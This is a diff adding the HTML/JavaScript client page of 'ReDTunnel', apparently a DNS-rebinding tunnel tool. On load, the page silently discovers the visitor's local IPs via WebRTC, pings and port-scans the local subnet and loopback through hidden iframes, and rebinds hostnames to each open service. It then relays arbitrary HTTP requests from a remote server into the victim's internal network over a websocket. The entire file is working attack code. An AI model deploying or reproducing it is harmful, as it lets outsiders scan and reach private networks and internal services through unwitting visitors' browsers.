@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ReDTunnel</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        function connect(id) {
+            let socket = io({
+                query: {"id": id},
+                transports: ['websocket']
+            });
+
+            socket.on('connect', () => {
+                console.log("connected");
+            });
+
+            socket.on(id, (data) => {
+                // console.log(data);
+                switch (data.type) {
+                    case "resource":
+                        let iframeId = getDNSRebindingId(data.id, data.ip, data.port);
+                        let iframe = document.getElementById(iframeId);
+                        if (!iframe) {
+                            console.error(`IFrame ${iframeId} doesn't exist`);
+                            break;
+                        }
+                        iframe.contentWindow.postMessage({
+                            type: "resource",
+                            id: data.id,
+                            ip: data.ip,
+                            port: data.port,
+                            path: data.path,
+                            method: data.method,
+                            headers: data.headers,
+                            body: data.body,
+                            uuid: data.uuid
+                        }, '*');
+                        break;
+                }
+            });
+
+            return socket;
+        }
+
+        async function register() {
+            let response = await fetch('/register');
+            let data = await response.json();
+            return data.id;
+        }
+
+        async function getConfig() {
+            let response = await fetch('/config');
+            return response.json();
+        }
+
+        async function identify() {
+            let id = localStorage.getItem('id');
+            if (!id) {
+                id = await register();
+                localStorage.setItem('id', id);
+            }
+            return id;
+        }
+    </script>
+
+    <script>
+        function getLocalInterfaceIps() {
+            return new Promise((resolve, reject) => {
+                if (!window.RTCPeerConnection || !window.RTCPeerConnection.prototype.createDataChannel) {
+                    return reject(new Error('WebRTC not supported by browser'));
+                }
+
+                let pc = new RTCPeerConnection();
+                let ips = [];
+
+                pc.createDataChannel("");
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(err => reject(err));
+                pc.onicecandidate = (event) => {
+                    if (!event || !event.candidate) {
+                        // All ICE candidates have been sent.
+                        if (ips.length === 0) {
+                            return reject(new Error('WebRTC disabled or restricted by browser'));
+                        }
+                        return resolve(ips);
+                    }
+
+                    let parts = event.candidate.candidate.split(' ');
+                    let [base, componentId, protocol, priority, ip, port, , type, ...attr] = parts;
+
+                    if (!ips.some(e => e === ip))
+                        ips.push(ip);
+                };
+            });
+        }
+
+        function* iterateLocalNetworkIps(ips) {
+            yield '127.0.0.1';
+            for (let ip of ips) {
+                let network = ip.replace(/\.(\d+)$/, '');
+                for (let i = 1; i < 254; i++) {
+                    let networkIp = `${network}.${i}`;
+                    if (networkIp === ip) {
+                        continue;
+                    }
+                    yield networkIp;
+                }
+            }
+        }
+
+        function shuffle(list) {
+            let m = list.length, i;
+            while (m) {
+                i = (Math.random() * m--) >>> 0;
+                [list[m], list[i]] = [list[i], list[m]]
+            }
+            return list;
+        }
+
+        function getRandomString(bufferSize = 8) {
+            let buffer = new window.Uint16Array(bufferSize);
+            return Array.from(window.crypto.getRandomValues(buffer)).map(value => {
+                return value.toString(32);
+            }).join("");
+        }
+
+        // function* iterateScanLists(ips, ports, maxScansInFrame) {
+        //     let scanList = [];
+        //     for (let ip of iterateLocalNetworkIps(ips)) {
+        //         for (port of ports) {
+        //             scanList.push({ip: ip, port: port});
+        //             if (scanList.length >= maxScansInFrame) {
+        //                 yield scanList;
+        //                 scanList = [];
+        //             }
+        //         }
+        //     }
+        //     if (scanList) {
+        //         yield scanList;
+        //     }
+        // }
+
+        function getDNSRebindingURL(id, ip, port) {
+            let hostname = window.location.hostname;
+            let random = getRandomString();
+            return `//${ip.replace(/\./g, "-")}.${id}.${random}.${hostname}:${port}/rebind`;
+        }
+
+        function getDNSRebindingId(id, ip, port) {
+            return `${ip.replace(/\./g, '-')}.${port}.${id}`;
+        }
+
+        function createIframe(url, className, id) {
+            let iframe = document.createElement('iframe');
+            iframe.async = true;
+            iframe.style.display = 'none';
+            iframe.sandbox = "allow-scripts allow-same-origin";
+            if (id) {
+                iframe.id = id;
+            }
+            if (className) {
+                iframe.className = className;
+            }
+            iframe.src = url;
+            return iframe;
+        }
+
+        function promiseIframe(url, className, id) {
+            return new Promise((resolve, reject) => {
+                let iframe = createIframe(url, className, id);
+                iframe.addEventListener("load", () => {
+                    resolve(iframe);
+                });
+                iframe.addEventListener("error", (error) => {
+                    reject(error);
+                });
+                document.body.appendChild(iframe);
+            });
+        }
+
+        function rebind(id, ip, port, rebindInterval = 5000, rebindDelay = 15000) {
+            let url = getDNSRebindingURL(id, ip, port);
+            let iframeId = getDNSRebindingId(id, ip, port);
+            let iframe = createIframe(url, 'rebind', iframeId);
+            iframe.onload = function () {
+                this.contentWindow.postMessage({
+                    type: 'rebind',
+                    id: id,
+                    ip: ip,
+                    port: port,
+                    rebindInterval: rebindInterval,
+                    rebindDelay: rebindDelay
+                }, '*');
+            }
+            document.body.appendChild(iframe);
+            return iframe;
+        }
+    </script>
+</head>
+<body>
+<script>
+    (async () => {
+        const config = await getConfig();
+        const id = await identify();
+        const socket = await connect(id);
+        const ping = await promiseIframe(`/ping?size=${config.poolSize}`, 'ping', 'ping');
+        const scan = await promiseIframe(`/scan?size=${config.poolSize}`, 'scan', 'scan');
+
+        addEventListener("message", (event) => {
+            let origin = event.origin || event.originalEvent.origin;
+            let url = new URL(origin);
+            if (!url.hostname.endsWith(location.hostname)) {
+                return;
+            }
+
+            let data = event.data;
+            // console.log(JSON.stringify(data, undefined, 2));
+            switch (data.type) {
+                case "ping":
+                    socket.emit(id, data);
+                    ping.remove();
+
+                    let scanIps = [];
+                    for (let result of data.list) {
+                        if (result.timeout) {
+                            console.error(JSON.stringify(result));
+                            continue;
+                        }
+
+                        console.log(JSON.stringify(result));
+
+                        scanIps.push(result.ip);
+                    }
+
+                    scan.contentWindow.postMessage({
+                        id: id,
+                        ips: scanIps,
+                        ports: config.ports,
+                        timeout: config.scanTimeout,
+                        findAuthResponses: config.findAuthResponses,
+                    });
+                    break;
+                case "scan":
+                    socket.emit(id, data);
+                    scan.remove();
+
+                    for (let result of data.list) {
+                        result.type = "scan";
+                        result.id = id;
+                        if (result.error || (result.timeout && !config.findAuthResponses)) {
+                            console.error(JSON.stringify(result));
+                            continue;
+                        }
+
+                        console.log(JSON.stringify(result));
+                        rebind(id, result.ip, result.port, config.rebindInterval, config.rebindDelay);
+                    }
+                    break;
+                case "rebind":
+                    socket.emit(id, data);
+                    if (data.error) {
+                        let iframeId = getDNSRebindingId(data.id, data.ip, data.port);
+                        document.getElementById(iframeId).remove();
+                        console.error(JSON.stringify(data));
+                        break;
+                    }
+
+                    console.log(JSON.stringify(data));
+                    break;
+                case "resource":
+                    console.warn(JSON.stringify(data));
+                    socket.emit(id, data);
+                    break;
+            }
+        }, false);
+
+        let localIps = Array.from(
+            iterateLocalNetworkIps(
+                config.loopBackOnly ? [] : await getLocalInterfaceIps()
+            )
+        );
+        // let localIps = Array.from(iterateLocalNetworkIps(['192.168.1.85']));
+        ping.contentWindow.postMessage({
+            id: id,
+            ips: config.shuffleIps ? shuffle(localIps) : localIps,
+            port: config.pingPort,
+            timeout: config.pingTimeout,
+        });
+    })();
+</script>
+</body>
+</html>
